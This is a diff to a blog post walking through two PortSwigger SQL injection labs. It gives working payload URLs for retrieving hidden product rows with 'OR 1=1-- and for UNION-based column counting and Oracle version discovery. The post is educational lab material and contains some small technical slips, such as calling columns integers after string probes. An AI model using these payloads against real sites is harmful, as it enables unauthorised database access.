@@ -25,4 +25,50 @@ SQL Injection takes advantage of poorly designed SQL. In writing codes, sometime
 
 ### Retrieving hidden data
 
-Using this [lab][https://insecure-website.com/products?category=Gifts] 
+Using this [lab][https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data], we can attempt to update the address link for product categories to show the hidden item listings.
+
+{% highlight ruby %}
+# The initial address link is: https://0aed008b04cb932680e830c6006d0037.web-security-academy.net/filter?category=Accessories
+
+# From the context of the lab, we know that the logic of how categories of item displayed is using SQL below
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+# We dont see the AND released = 1 in the address link, however we can avoid it by adding a "'OR+1=1--" to the end
+# Completed link: https://0aed008b04cb932680e830c6006d0037.web-security-academy.net/filter?category=Accessories%27OR+1=1--
+{% endhighlight %}
+
+We first uses `'` to test, because that would throw a syntax error in SQL. Then we add a `OR` condition to it, `1=1` evaluates to True. `--` is a comment statement, for us to dump whatever is the hidden SQL query in the backend. In this case it would be `AND released = 1`. Now we can view the rest of the listings which was previously hidden.
+
+### Discovering the underlying SQL database type 
+
+As there are many variants of SQL, some of them are Oracle, Microsoft, PostgreSQL. We can use a [second_lab][ref_2] to understand how to do it. 
+
+{%highlight ruby %}
+# In this lab, we have to first figure out, how many positional arguments can we manipulate.
+## Step 1
+# Method 1, Union Select NULL, NULL...(increase accordingly)
+Address Link: https://0abf004603095fb5801c173a004b00d5.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27UNION+SELECT+NULL+,NULL+FROM+DUAL--
+# Method 2, order by 1(++), increment it until Internal Server Error.
+Address Link: https://0abf004603095fb5801c173a004b00d5.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27order%20by%203--
+
+## Step 2 - Determine type
+Address Link: https://0abf004603095fb5801c173a004b00d5.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27UNION+SELECT+%27as%27,+%27as%27+FROM+DUAL--
+
+## Step 3 - Get the Database Version 
+Address Link: https://0abf004603095fb5801c173a004b00d5.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27UNION+SELECT%20banner,+NULL%20FROM%20v$version%20--
+
+{% endhighlight %}
+![hi there](../assets/images/portswigger1_database.png "example of how the database is displayed")
+
+In step 1, when we have a SQL vulnerabilty. We first have to do a enumeration check, to understand how many arguments are we allowed to supply. We can use method 1 by using `' UNION SELECT NULL, NULL` and increment the NULL accordingly. The (number of NULL that causes Internal Server Error) - 1 = `num of arguments`. We also need to specify `FROM DUAL` in this, because its Oracle. And this is specific to Oracle only.
+
+After getting the number of arguments, now we need to check the types of arguments. We can do that by manually replacing NULL (which works for any types) to strings such as 'abc' or integers 1. For this case, both the arguments are integers. Do note there are some cases where neither of them are available, in a way its hidden.
+
+In step 3, we can use the [cheatsheet][ref_1] to use the query to obtain the version. Results are as image above.
+
+
+
+
+## Resources
+[ref_1]: https://portswigger.net/web-security/sql-injection/cheat-sheet
+[ref_2]: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
